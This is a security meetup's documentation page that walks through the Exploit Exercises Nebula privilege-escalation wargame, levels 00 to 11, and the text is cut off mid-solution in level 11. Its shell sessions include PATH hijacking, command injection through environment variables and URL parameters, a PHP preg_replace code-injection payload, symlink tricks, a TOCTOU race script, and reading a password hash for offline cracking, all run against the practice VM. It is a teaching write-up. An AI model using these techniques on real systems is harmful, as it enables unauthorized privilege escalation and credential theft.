

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta content="default-src 'none'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'" http-equiv="Content-Security-Policy" />
<meta content="nosniff" http-equiv="X-Content-Type-Options" />
<meta content="deny" http-equiv="X-Frame-Options" />
<meta content="1; mode=block" http-equiv="X-XSS-Protection" />
<meta content="strict-origin" http-equiv="Referrer-Policy" />
<meta content="max-age=31536000; includeSubDomains" http-equiv="Strict-Transport-Security" />
<meta content="'*'" http-equiv="Access-Control-Allow-Origin" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>3.28. Exploit Exercises Nebula &mdash; South Bay WASP 1.0.3 documentation</title>
  

  
  
  
  

  

  
  
    

  

  <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="3.29. Natas" href="natas.html" />
    <link rel="prev" title="3.27. SkyTower1" href="skytower1.html" /> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="VWADP.html">3.1. Finding and running challenges</a></li>
<li class="toctree-l2"><a class="reference internal" href="flaws.html">3.2. flaws</a></li>
<li class="toctree-l2"><a class="reference internal" href="moinmoin.html">3.3. MoinMoin</a></li>
<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.4. OwlNest</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.5. De-ICE Level 6</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.6. De-ICE Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.7. De-ICE Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.8. De-ICE Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.9. De-ICE Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.10. De-ICE Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.11. Underdist: 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.12. Kioptrix Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.13. Kioptrix Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.14. Kioptrix Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.15. Kioptrix Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.16. Kioptrix Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.17. Security Shepherd Web App Levels</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.18. Holynix2</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.19. Holynix1</a></li>
<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.20. Freshly</a></li>
<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.21. ZorZ</a></li>
<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.22. Vulnix</a></li>
<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.23. Google’s XSS Game</a></li>
<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.24. Owning the Database with SQLMap</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.25. PentesterLab From SQL injection to Shell II</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.26. PentesterLab From SQL injection to Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.27. SkyTower1</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">3.28. Exploit Exercises Nebula</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id22">3.28.1. Nebula Level 00</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id23">3.28.2. Nebula Level 01</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id24">3.28.3. Nebula Level 02</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id25">3.28.4. Nebula Level 03</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id26">3.28.5. Nebula Level 04</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id27">3.28.6. Nebula Level 05</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id28">3.28.7. Nebula Level 06</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id29">3.28.8. Nebula Level 07</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id30">3.28.9. Nebula Level 08</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id31">3.28.10. Nebula Level 09</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id32">3.28.11. Nebula Level 10</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id33">3.28.12. Nebula Level 11</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id34">3.28.13. Nebula Level 12</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id35">3.28.14. Nebula Level 13</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id36">3.28.15. Nebula Level 14</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id37">3.28.16. Nebula Level 15</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id38">3.28.17. Nebula Level 16</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id39">3.28.18. Nebula Level 17</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id40">3.28.19. Nebula Level 18</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id41">3.28.20. Nebula Level 19</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="natas.html">3.29. Natas</a></li>
<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.30. try2hack.nl</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      <div class="wy-nav-content">
        
        <div class="rst-content">
        
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
        
      <li>3.28. Exploit Exercises Nebula</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/challenges/nebula.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="exploit-exercises-nebula">
<span id="nebula"></span><h1>3.28. Exploit Exercises Nebula<a class="headerlink" href="#exploit-exercises-nebula" title="Permalink to this headline">¶</a></h1>
<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="http://exploit-exercises.com/nebula">Exploit Exercises Nebula</a>. Nebula intends to teach the basics of local privilege escalation.</p>
<p>Don’t spend too much time on any one exercise - peek to get a hint. For the most part, the solutions are relatively easy if you understand the concepts.  If you don’t get it then there’s either some simple error or unknown concept that is an impediment. In both cases that’s not worth hours flailing away - your goal is to learn new concepts efficiently. In fact, it appears level11 no longer has a solution. You also may find level15, level17, and level18 (at least parts of it) challenging.</p>
<div class="section" id="id22">
<h2>3.28.1. <a class="reference external" href="http://exploit-exercises.com/nebula/level00">Nebula Level 00</a><a class="headerlink" href="#id22" title="Permalink to this headline">¶</a></h2>
<p>Download and run the nebula vm, logging in with level00/level00.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level00@nebula:~$</span> find / -perm /g+s -user flag00 <span class="m">2</span>&gt;/dev/null
<span class="go">/bin/.../flag00</span>
<span class="go">/rofs/bin/.../flag00</span>
<span class="gp">level00@nebula:~$</span> /bin/.../flag00
<span class="go">Congrats, now run getflag to get your flag!</span>
<span class="gp">flag00@nebula:~$</span> getflag
<span class="go">You have successfully executed getflag on a target account</span>
<span class="gp">flag00@nebula:~$</span>
</pre></div>
</div>
</div>
<div class="section" id="id23">
<h2>3.28.2. <a class="reference external" href="http://exploit-exercises.com/nebula/level01">Nebula Level 01</a><a class="headerlink" href="#id23" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level01/level01.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level01@nebula:~$</span> <span class="nb">echo</span> getflag &gt; <span class="nb">echo</span>
<span class="gp">level01@nebula:~$</span> chmod +x <span class="nb">echo</span>
<span class="gp">level01@nebula:~$ PATH=/home/level01:$</span>PATH /home/flag01/flag01
<span class="go">You have successfully executed getflag on a target account</span>
<span class="gp">level01@nebula:~$</span>
</pre></div>
</div>
</div>
<div class="section" id="id24">
<h2>3.28.3. <a class="reference external" href="http://exploit-exercises.com/nebula/level02">Nebula Level 02</a><a class="headerlink" href="#id24" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level02/level02.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level02@nebula:~$</span> <span class="nv">USER</span><span class="o">=</span><span class="s2">&quot;; getflag; echo &quot;</span> /home/flag02/flag02
<span class="go">about to call system(&quot;/bin/echo ; getflag; echo  is cool&quot;)</span>

<span class="go">You have successfully executed getflag on a target account</span>
<span class="go">is cool</span>
<span class="gp">level02@nebula:~$</span>
</pre></div>
</div>
</div>
<div class="section" id="id25">
<h2>3.28.4. <a class="reference external" href="http://exploit-exercises.com/nebula/level03">Nebula Level 03</a><a class="headerlink" href="#id25" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level03/level03.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level03@nebula:~$</span> cat &gt; ~flag03/writable.d/runme.sh &lt;&lt;EOF
<span class="gp">#</span>!/usr/bin/env bash
<span class="go">cp /bin/getflag /home/flag03/</span>
<span class="go">chmod 4777 /home/flag03/getflag</span>
<span class="go">EOF</span>
<span class="gp">level03@nebula:~$ #</span> ... <span class="nb">wait</span> <span class="k">for</span> cronjob to run ...
<span class="gp">level03@nebula:~$</span> /home/flag03/getflag
<span class="go">You have successfully executed getflag on a target account</span>
<span class="gp">level03@nebula:~$</span>
</pre></div>
</div>
</div>
<div class="section" id="id26">
<h2>3.28.5. <a class="reference external" href="http://exploit-exercises.com/nebula/level04">Nebula Level 04</a><a class="headerlink" href="#id26" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level04/level04.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level04@nebula:~$</span> ln -s /home/flag04/token bypass
<span class="gp">level04@nebula:~$</span> /home/flag04/flag04 bypass
<span class="go">06508b5e-8909-4f38-b630-fdb148a848a2</span>
<span class="gp">level04@nebula:~$ #</span> use this as password <span class="k">for</span> su
<span class="gp">level04@nebula:~$</span> su - flag04 -c getflag
<span class="go">Password: 06508b5e-8909-4f38-b630-fdb148a848a2</span>
<span class="go">You have successfully executed getflag on a target account</span>
<span class="gp">level04@nebula:~$</span>
</pre></div>
</div>
</div>
<div class="section" id="id27">
<h2>3.28.6. <a class="reference external" href="http://exploit-exercises.com/nebula/level05">Nebula Level 05</a><a class="headerlink" href="#id27" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level05/level05.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level05@nebula:~$</span> tar -xzvf ~flag05/.backup/backup-19072011.tgz
<span class="gp">level05@nebula:~$</span> ssh flag05@nebula
<span class="go">The authenticity of host &#39;nebula (127.0.0.1)&#39; can&#39;t be established.</span>
<span class="go">ECDSA key fingerprint is ea:8d:0:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.</span>
<span class="go">Are you sure you want to continue connecting (yes/no)? yes</span>
<span class="go">...</span>
<span class="gp">flag05@nebula:~$</span> getflag
<span class="go">You have successfully executed getflag on a target account</span>
<span class="gp">flag05@nebula:~$</span>
</pre></div>
</div>
</div>
<div class="section" id="id28">
<h2>3.28.7. <a class="reference external" href="http://exploit-exercises.com/nebula/level06">Nebula Level 06</a><a class="headerlink" href="#id28" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level06/level06.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level06@nebula:~$</span> grep flag06 /etc/passwd <span class="p">|</span> cut -d: -f <span class="m">2</span>
<span class="go">ueqwOCnSGdsuM</span>
<span class="gp">level06@nebula:~$ #</span> Go offline with a password cracker and get <span class="s2">&quot;hello&quot;</span>
<span class="gp">level06@nebula:~$</span> su - flag06 -c getflag
<span class="go">Password: hello</span>
<span class="go">You have successfully executed getflag on a target account</span>
<span class="gp">level06@nebula:~$</span>
</pre></div>
</div>
</div>
<div class="section" id="id29">
<h2>3.28.8. <a class="reference external" href="http://exploit-exercises.com/nebula/level07">Nebula Level 07</a><a class="headerlink" href="#id29" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level07/level07.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level07@nebula:~$</span> wget -q -O - <span class="se">\</span>
    http://nebula:7007/?Host<span class="o">=</span>www.google.com%3B%20getflag <span class="p">|</span> <span class="se">\</span>
    grep getflag
<span class="go">You have successfully executed getflag on a target account</span>
<span class="gp">flag07@nebula:~$</span>
</pre></div>
</div>
</div>
<div class="section" id="id30">
<h2>3.28.9. <a class="reference external" href="http://exploit-exercises.com/nebula/level08">Nebula Level 08</a><a class="headerlink" href="#id30" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level08/level08.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>level08@nebula:~$ # The only interesting file seems to be ~flag08/capture.pcap
level08@nebula:~$ ls -laR ~flag08
/home/flag08:
total 14
drwxr-x--- 2 flag08 level08   86 2012-08-19 03:07 .
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
-rw-r--r-- 1 flag08 flag08   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag08 flag08  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 root   root    8302 2011-11-20 21:22 capture.pcap
-rw-r--r-- 1 flag08 flag08   675 2011-05-18 02:54 .profile
level08@nebula:~$ # break traffic into separate flows
level08@nebula:~$ tcpflow -q -r capture.pcap
level08@nebula:~$ # look at outbound traffic for level 8 passwords
level08@nebula:~$ od -c 059.233.235.218.39247-059.233.235.223.12121
###################### SNIP ######################
0000260 374   &quot;   l   e   v   e   l   8  \r   b   a   c   k   d   o   o
0000300   r 177 177 177   0   0   R   m   8 177   a   t   e  \r
0000316
level08@nebula:~$ # There goes &quot;backdoo&quot; DEL DEL DEL &quot;00Rm8&quot; DEL &quot;ate&quot;
level08@nebula:~$ # = &quot;backd00Rmate&quot; after applying DEL&#39;s
level08@nebula:~$ su - flag08 -c getflag
Password: backd00Rmate
You have successfully executed getflag on a target account
level08@nebula:~$
</pre></div>
</div>
</div>
<div class="section" id="id31">
<h2>3.28.10. <a class="reference external" href="http://exploit-exercises.com/nebula/level09">Nebula Level 09</a><a class="headerlink" href="#id31" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level09/level09. If you run <code class="docutils literal notranslate"><span class="pre">objdump</span> <span class="pre">-M</span> <span class="pre">intel</span> <span class="pre">S</span> <span class="pre">~flag09/flag09</span> <span class="pre">&gt;</span> <span class="pre">code.txt</span></code> and <code class="docutils literal notranslate"><span class="pre">objdump</span> <span class="pre">-j</span> <span class="pre">.rodata</span> <span class="pre">-S</span> <span class="pre">~flag09/flag09</span> <span class="pre">&gt;</span> <span class="pre">rodata.txt</span></code> you’ll see that <code class="docutils literal notranslate"><span class="pre">~flag09/flag09</span></code> does <code class="docutils literal notranslate"><span class="pre">setuid(geteuid())</span></code> then calls <code class="docutils literal notranslate"><span class="pre">execve()</span></code> to run <code class="docutils literal notranslate"><span class="pre">/usr/bin/php</span> <span class="pre">-f</span> <span class="pre">/home/flag09/flag09.php</span></code> with <em>PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</em> and <em>PS1=wibblywobblytimeywimeystuff$</em>. So don’t get any smart ideas about playing with the PATH or running a substitute <code class="docutils literal notranslate"><span class="pre">~flag09/flag09</span></code>. See <a class="reference external" href="http://php.net/manual/en/reference.pcre.pattern.modifiers.php">e (PREG_REPLACE_EVAL)</a> for an example of PHP code injection for <code class="docutils literal notranslate"><span class="pre">preg_replace</span></code>.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level09@nebula:~$</span> <span class="nb">echo</span> <span class="s1">&#39;[email {${`getflag`}}]&#39;</span> &gt; exploit
<span class="gp">level09@nebula:~$</span> ~flag09/flag09 exploit dont_use_me
<span class="go">PHP Notice:  Undefined variable: You have successfully executed getflag on a target account</span>
<span class="go"> in /home/flag09/flag09.php(15) : regexp code on line 1</span>

<span class="gp">level09@nebula:~$</span>
</pre></div>
</div>
</div>
<div class="section" id="id32">
<h2>3.28.11. <a class="reference external" href="http://exploit-exercises.com/nebula/level10">Nebula Level 10</a><a class="headerlink" href="#id32" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level10/level10. First we point out an apparently unintended “solution” which shows a “bug” in the nebula level10 setup: there’s a file <em>x</em> that has the flag10 password in it:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level10@nebula:~$</span> ls
<span class="go">x</span>
<span class="gp">level10@nebula:~$</span> strings x
<span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
<span class="gp">level10@nebula:~$</span> su - flag10 -c getflag
<span class="go">Password: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
<span class="go">You have successfully executed getflag on a target account</span>
<span class="gp">level10@nebula:~$</span>
</pre></div>
</div>
<p>OK - let’s figure out the real solution. First the obvious things. The level10 description points to <a class="reference external" href="http://linux.die.net/man/2/access">access(2)</a> which has the huge hint:</p>
<blockquote>
<div>Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.</div></blockquote>
<p>Second obvious thing based on the prior levels is that <em>~flag10/token</em> is what we’re after.</p>
<p>Combining these, we’re going to run <code class="docutils literal notranslate"><span class="pre">~flag10/flag10</span> <span class="pre">safe</span> <span class="pre">127.0.0.1</span></code> where <em>safe</em> starts out as something level10 can access but is changed to become <code class="docutils literal notranslate"><span class="pre">ln</span> <span class="pre">-s</span> <span class="pre">~flag10/token</span> <span class="pre">safe</span></code>. So sometime immediately after the attempt to connect to port 18211, <em>safe</em> must be changed to reference <em>~flag10/token</em>. We choose to use <code class="docutils literal notranslate"><span class="pre">socat</span></code> to connect to port 18211 because it can run a script (to switch <em>safe</em>) in response to a connection (and we’ll make it spawn a new task for each connection):</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level10@nebula:~$</span> <span class="nb">echo</span> <span class="s2">&quot;.oO Oo.&quot;</span> &gt; safe
<span class="gp">level10@nebula:~$</span> cp safe capture
<span class="gp">level10@nebula:~$</span> cat &gt; capture18211.sh &lt;&lt;EOF
<span class="gp">#</span>!/usr/bin/env bash
<span class="go">cd /home/level10</span>
<span class="go">rm -f safe</span>
<span class="go">ln -s ~flag10/token safe</span>
<span class="go">cat - &gt;capture</span>
<span class="go">rm -f safe</span>
<span class="go">echo &quot;.oO Oo.&quot; &gt;safe</span>
<span class="go">EOF</span>
<span class="gp">level10@nebula:~$</span> chmod +x capture18211.sh
<span class="gp">level10@nebula:~$</span> socat tcp4-listen:18211,bind<span class="o">=</span><span class="m">127</span>.0.0.1,reuseaddr,fork <span class="se">\</span>
    EXEC:/home/level10/capture18211.sh
</pre></div>
</div>
<p>In another window we’ll try running <code class="docutils literal notranslate"><span class="pre">~flag10/flag10</span> <span class="pre">safe</span> <span class="pre">127.0.0.1</span></code> in a loop to see if <code class="docutils literal notranslate"><span class="pre">socat</span> <span class="pre">...</span> <span class="pre">EXEC:/home/level10/capture18211.sh</span></code> is fast enough to switch <em>safe</em> to <code class="docutils literal notranslate"><span class="pre">ln</span> <span class="pre">-s</span> <span class="pre">~flag10/token</span> <span class="pre">safe</span></code>:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level10@nebula:~$</span> cat &gt; try.sh &lt;&lt;EOF
<span class="gp">#</span>!/usr/bin/env bash
<span class="go">while [ \$(grep -v &quot;oO Oo.&quot; capture | wc -l) -eq 0 ] ; do</span>
<span class="go">  ~flag10/flag10 safe 127.0.0.1</span>
<span class="go">done</span>
<span class="go">EOF</span>
<span class="gp">level10@nebula:~$</span> chmod +x try.sh
<span class="gp">level10@nebula:~$</span> ./try.sh
<span class="go">Connecting to 127.0.0.1:18211 .. Connected!</span>
<span class="go">Sending file .. wrote file!</span>
<span class="gp">level10@nebula:~$</span> cat capture
<span class="go">.oO Oo.</span>
<span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
<span class="gp">level10@nebula:~$</span> su - flag10 -c getflag
<span class="go">Password: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
<span class="go">You have successfully executed getflag on a target account</span>
<span class="gp">level10@nebula:~$</span>
</pre></div>
</div>
<p>With only 1 try it worked. Now if it didn’t work in lots of attempts we could try using <code class="docutils literal notranslate"><span class="pre">nice</span> <span class="pre">-n</span> <span class="pre">19</span> <span class="pre">./try.sh</span></code> to slow down <code class="docutils literal notranslate"><span class="pre">~flag10/flag10</span> <span class="pre">...</span></code>.</p>
</div>
<div class="section" id="id33">
<h2>3.28.12. <a class="reference external" href="http://exploit-exercises.com/nebula/level11">Nebula Level 11</a><a class="headerlink" href="#id33" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level11/level11.</p>
<p>This one can’t be solved in the intended manner. If you run <code class="docutils literal notranslate"><span class="pre">objdump</span> <span class="pre">-M</span> <span class="pre">intel</span> <span class="pre">-S</span> <span class="pre">~flag11/flag11</span> <span class="pre">&gt;</span> <span class="pre">code.txt</span></code> you’ll see that the purported source file for this one is not the actual code for <code class="docutils literal notranslate"><span class="pre">~flag11/flag11</span></code>. That is, the running <code class="docutils literal notranslate"><span class="pre">~flag11/flag11</span></code> program’s function <code class="docutils literal notranslate"><span class="pre">process()</span></code> calls <code class="docutils literal notranslate"><span class="pre">setgid(getgid())</span></code> and <code class="docutils literal notranslate"><span class="pre">setuid(getuid())</span></code> prior to running <code class="docutils literal notranslate"><span class="pre">system()</span></code>. <code class="docutils literal notranslate"><span class="pre">getuid()</span></code> gets the real uid while <code class="docutils literal notranslate"><span class="pre">setuid()</span></code> sets the effective uid, making the <code class="docutils literal notranslate"><span class="pre">system()</span></code> call run as level11. So <code class="docutils literal notranslate"><span class="pre">getflag</span></code> cannot successfully be run by exploiting the <code class="docutils literal notranslate"><span class="pre">system()</span></code> call. Booo - a waste of time. You can search the web for “solutions”, but if you actually run them they won’t work - something changed since they posted their solution.</p>
<p>If the code were as given in the problem description, then the following would work (after running a number of times because a buffer is uninitialized and we must wait until we get byte 2 of buf to be zero).</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level11@nebula:~$</span> cat &gt; input &lt;&lt;EOF
<span class="go">Content-Length: 1</span>
<span class="go">B</span>
<span class="go">EOF</span>
<span class="gp">level11@nebula:~$</span> ln -s /bin/getflag C
<span class="gp">level11@nebula:~$ #</span> Run <span class="k">until</span> 2nd byte of buf is <span class="m">0</span>.
<span class="gp">level11@nebula:~$ PATH=/home/level11:$</span>PATH ~flag11/flag11 &lt; input
<span class="gp">sh: $</span><span class="s1">&#39;C\360\256&#39;</span>: <span class="nb">command</span> not found
<span class="gp">level11@nebula:~$ PATH=/home/level11:$</span>PATH ~flag11/flag11 &lt; input
<span class="go">getflag is executing on a non-flag account, this doesn&#39;t count</span>
</pre></div>
</div>
<p>Yes, we know that if you produce a buffer of length 1024 instead of 1 you can avoid that problem, but we want to spend as little time as possible on this broken problem.</p>
<p>On a side note we’ll explain something that is left out of other web attempts at this problem. You see that the <code class="docutils literal notranslate"><span class="pre">process()</span></code> function mangles your input, so you can’t just place “getflag” in the input. You have to create input that when mangled gives you “getflag”, in essense computing the inverse of <code class="docutils literal notranslate"><span class="pre">process()</span></code>. Here is the key part of <code class="docutils literal notranslate"><span class="pre">process()</span></code>:</p>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">;</span>
  <span class="n">key</span> <span class="o">-=</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
<span class="p">}</span>
</pre></div>
</div>
<p>So how to reverse this? If you start with buffer b[0], b[1], … you also have implicity key = k[0], k[1], … where k[i+1] = k[i] - b[i]^k[i]. (NOTE - the “C” code in <code class="docutils literal notranslate"><span class="pre">key</span> <span class="pre">-=</span> <span class="pre">buffer[i];</span></code> uses <code class="docutils literal notranslate"><span class="pre">buffer[i]</span></code> which already has <code class="docutils literal notranslate"><span class="pre">^=key</span></code> applied to it, so that’s where the formula for k[i+1] has the k[i] on the right side.) Say we run <code class="docutils literal notranslate"><span class="pre">process()</span></code> producing B[0], B[1], … and implicity K[0] = k[0], K[1], … . How do we compute the inverse?</p>
<p>Clearly B[0] = b[0] ^ k[0] = b[0] ^ K[0], so applying (^ K[0]) to both sides gets us B[0] ^ K[0] = b[1].</p>
<p>Next, following <code class="docutils literal notranslate"><span class="pre">process()</span></code> B[1] = b[1] ^ (k[0] - b[0] ^ k[0]), substituting B[0] on the right we get B[1] = b[1] ^ (K[0] - B[0]) or (applying “^ (K[0] - B[0])” to both sides) B[1] ^ (K[0] - B[0]) = b[1].</p>
<p>So then the inverse computation code is slightly different as shown below. (NOTE - the “C” code in <code class="docutils literal notranslate"><span class="pre">key</span> <span class="pre">-=</span> <span class="pre">buffer[i]</span> <span class="pre">^</span> <span class="pre">key;</span></code> uses <code class="docutils literal notranslate"><span class="pre">buffer[i]</span></code> which already has <code class="docutils literal notranslate"><span class="pre">^=key</span></code> applied to it, and we need the <em>original</em> buffer[i], so we have to apply a second <code class="docutils literal notranslate"><span class="pre">^</span> <span class="pre">key</span></code> to it below. Remember, <em>buffer[i] ^ key ^ key = buffer[i]</em>.)</p>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">;</span>
